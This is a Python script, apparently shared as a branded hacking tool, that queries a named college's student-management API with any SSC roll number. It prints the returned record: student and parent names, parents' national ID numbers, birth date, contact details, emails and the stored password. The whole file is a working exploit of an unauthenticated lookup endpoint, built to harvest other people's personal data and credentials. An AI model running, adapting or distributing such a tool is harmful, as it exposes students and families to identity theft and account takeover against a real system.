import requests
import json
import os
from requests.structures import CaseInsensitiveDict

red="\033[0;31m"          # Red

yellow="\033[0;33m"       # Yellow

green="\033[0;32m"        # Green

color_off="\033[0m"       # Text Reset

bblack="\033[1;30m"       # Black

bred="\033[1;31m"         # Red

ured="\033[4;31m"         # Red

on_green="\033[42m"       # Green

blue="\033[0;34m"         # Blue

lightblue = '\033[94m'

red = '\033[91m'

ured = '\e[4;31m'

bhred = '\e[1;91m'

white = '\33[97m'

yellow = '\33[93m'

green = '\033[1;32m'

cyan  = "\033[96m"

end = '\033[0m'

purple="\033[0;35m"

beige="\033[1;38;5;229m"

def logo():
	os.system("clear")
	print(cyan+"   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
	
	print(cyan+"   ┃ "+yellow+"     TOOL NAME : "+green+"MS ZOHA COLLAGE STUDENT INFO  "+cyan+"┃")
	print(cyan+"   ┃ "+yellow+"     VERSION   : "+green+"1.0.0			    "+cyan+"┃")
	print(cyan+"   ┃ "+yellow+"     GITHUB    : "+green+"GITHUB.COM/SHTASRIF	    "+cyan+"┃")
	print(cyan+"   ┃ "+yellow+"     TELEGRAM  : "+green+"T.ME/CYBERSHBD		    "+cyan+"┃")
	print(cyan+"   ┃ "+yellow+"     FACEBOOK  : "+green+"FB.COM/CYBERSHBD		    "+cyan+"┃")
	print("   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"+lightblue)

def main():
	logo()
	url = "http://www.mszohacollege.edu.bd/SMS/Student/GetStudentByStudentID"

	headers = CaseInsensitiveDict()
	headers["Content-Type"] = "application/json"
	
	roll = str(input(purple+"   [+] "+yellow+"Enter Your SSC Roll : "+green))
	data = '{"yearId":"1","studentID":"'+roll+'"}'


	resp = requests.post(url, headers=headers, data=data).text

	data = json.loads(resp)
	
	name = (data["Name"])
	studentid = (data["StudentID"])
	rollno = (data["RollNo"])
	regno = (data["RegistrationNo"])
	fname = (data["FatherName"])
	fnid = (data["FatherNID"])
	mname = (data["MotherName"])
	mnid = (data["MotherNID"])
	sex = (data["Sex"])
	dob = (data["BirthDate"])
	poffice = (data["PostOffice"])
	email = (data["Email"])
	gcontact = (data["GurdianContact"])
	gemail = (data["GurdianEmail"])
	password = (data["Password"])
	
	#It's Printing Zone
	logo()
	print(beige+" [•] "+cyan+"Student Name"+purple+"	:	"+green+name)
	
	print(beige+" [•] "+cyan+"Student ID"+purple+"		:	"+green+studentid)
	
	print(beige+" [•] "+cyan+"Roll NO"+purple+"		:	"+green+str(rollno))
	
	print(beige+" [•] "+cyan+"Registration NO"+purple+"	:	"+green+str(regno))
	
	print(beige+" [•] "+cyan+"Father Name"+purple+"	:	"+green+fname)
	
	print(beige+" [•] "+cyan+"Father NID NO"+purple+"	:	"+green+str(fnid))
	
	print(beige+" [•] "+cyan+"Mother Name"+purple+"	:	"+green+mname)
	
	print(beige+" [•] "+cyan+"Mother NID NO"+purple+"	:	"+green+str(mnid))
	
	print(beige+" [•] "+cyan+"Student Sex"+purple+"	:	"+green+str(sex))
	
	print(beige+" [•] "+cyan+"Date Of Birth"+purple+"	:	"+green+dob)
	
	print(beige+" [•] "+cyan+"Post Office"+purple+"	:	"+green+poffice)
	
	print(beige+" [•] "+cyan+"Email"+purple+"		:	"+green+str(email))
	
	print(beige+" [•] "+cyan+"Contact NO"+purple+"		:	"+green+gcontact)
	
	print(beige+" [•] "+cyan+"Gurdian Email"+purple+"	:	"+green+str(gemail))
	
	print(beige+" [•] "+cyan+"Password"+purple+"		:	"+green+str(password))
	
	#os.system("xdg-open http://www.mszohacollege.edu.bd/Content/Images/Student/"+roll+".JPG")


